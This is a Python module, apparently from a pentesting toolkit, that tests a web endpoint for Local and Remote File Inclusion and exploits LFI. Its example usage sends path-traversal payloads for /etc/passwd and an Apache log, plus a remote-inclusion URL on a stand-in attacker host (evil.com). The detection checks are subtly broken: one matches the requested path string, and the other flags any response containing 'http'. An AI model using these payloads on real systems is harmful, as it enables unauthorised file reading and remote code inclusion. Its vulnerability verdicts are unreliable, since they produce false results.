"""
modules/pentesting_tools/file_inclusion_tester.py

This module provides tools for detecting and exploiting Local File Inclusion (LFI) and Remote File Inclusion (RFI)
vulnerabilities in web applications.
"""

import requests
from urllib.parse import urljoin


class FileInclusionTester:
    """
    A tool for detecting and exploiting LFI and RFI vulnerabilities.
    """

    def __init__(self, url):
        """
        Initializes the FileInclusionTester with a target URL.
        :param url: The base URL of the web application to test.
        """
        self.base_url = url

    def detect_lfi(self, param_name, file_paths):
        """
        Detects Local File Inclusion vulnerabilities by testing file paths.
        :param param_name: The parameter name to test for LFI.
        :param file_paths: A list of file paths to test.
        :return: List of vulnerable file paths.
        """
        vulnerable_files = []

        print(f"Testing for LFI at: {self.base_url}")
        for file_path in file_paths:
            payload = {param_name: file_path}
            try:
                response = requests.get(self.base_url, params=payload)
                if self._is_valid_lfi_response(response, file_path):
                    print(f"LFI vulnerability detected with file path: {file_path}")
                    vulnerable_files.append(file_path)
            except Exception as e:
                print(f"Error testing file path {file_path}: {e}")

        return vulnerable_files

    def detect_rfi(self, param_name, external_urls):
        """
        Detects Remote File Inclusion vulnerabilities by testing external URLs.
        :param param_name: The parameter name to test for RFI.
        :param external_urls: A list of external URLs to test.
        :return: List of vulnerable external URLs.
        """
        vulnerable_urls = []

        print(f"Testing for RFI at: {self.base_url}")
        for external_url in external_urls:
            payload = {param_name: external_url}
            try:
                response = requests.get(self.base_url, params=payload)
                if self._is_valid_rfi_response(response):
                    print(f"RFI vulnerability detected with URL: {external_url}")
                    vulnerable_urls.append(external_url)
            except Exception as e:
                print(f"Error testing URL {external_url}: {e}")

        return vulnerable_urls

    def exploit_lfi(self, param_name, payload):
        """
        Attempts to exploit LFI vulnerabilities with a custom payload.
        :param param_name: The parameter name to exploit.
        :param payload: The LFI payload to use.
        :return: Response content from the server.
        """
        exploit_params = {param_name: payload}
        try:
            response = requests.get(self.base_url, params=exploit_params)
            return response.text
        except Exception as e:
            print(f"Error during LFI exploitation: {e}")
            return None

    def _is_valid_lfi_response(self, response, file_path):
        """
        Checks if the server's response indicates a valid LFI vulnerability.
        :param response: The server's response.
        :param file_path: The file path tested.
        :return: Boolean indicating whether the response suggests an LFI vulnerability.
        """
        return file_path in response.text

    def _is_valid_rfi_response(self, response):
        """
        Checks if the server's response indicates a valid RFI vulnerability.
        :param response: The server's response.
        :return: Boolean indicating whether the response suggests an RFI vulnerability.
        """
        return "http" in response.text or "RFI Test" in response.text


if __name__ == "__main__":
    # Example Usage
    target_url = "https://example.com/vulnerable_endpoint"
    lfi_file_paths = [
        "../../etc/passwd",
        "../index.php",
        "../../../../../../var/log/apache2/access.log",
    ]
    rfi_urls = [
        "http://evil.com/malicious.php",
        "http://testsite.com/rfi_test",
    ]

    tester = FileInclusionTester(target_url)

    # Detect LFI vulnerabilities
    print("Detecting LFI vulnerabilities...")
    vulnerable_lfi_files = tester.detect_lfi("file", lfi_file_paths)
    print("Vulnerable LFI file paths:", vulnerable_lfi_files)

    # Detect RFI vulnerabilities
    print("Detecting RFI vulnerabilities...")
    vulnerable_rfi_urls = tester.detect_rfi("url", rfi_urls)
    print("Vulnerable RFI URLs:", vulnerable_rfi_urls)

    # Exploit LFI
    if vulnerable_lfi_files:
        print("Exploiting LFI vulnerabilities...")
        lfi_payload = "../../etc/passwd"
        lfi_response = tester.exploit_lfi("file", lfi_payload)
        print("LFI exploitation response:", lfi_response)
